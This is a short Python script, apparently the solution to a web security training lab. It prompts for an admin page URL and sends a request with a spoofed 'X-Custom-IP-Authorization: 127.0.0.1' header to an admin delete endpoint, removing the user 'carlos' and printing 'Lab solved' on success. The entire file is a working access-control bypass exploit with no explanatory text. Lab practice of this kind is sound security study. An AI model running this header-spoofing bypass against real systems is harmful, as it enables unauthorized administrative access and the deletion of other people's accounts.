#!/usr/bin/env python3

import requests

URL = input("Enter admin page url: ")

headers = {"X-Custom-IP-Authorization": "127.0.0.1"}
delete_url = URL + "/delete?username=carlos"
response = requests.get(url=delete_url, headers=headers)
if response.status_code == 200:
    print("💥 Lab solved!!!")
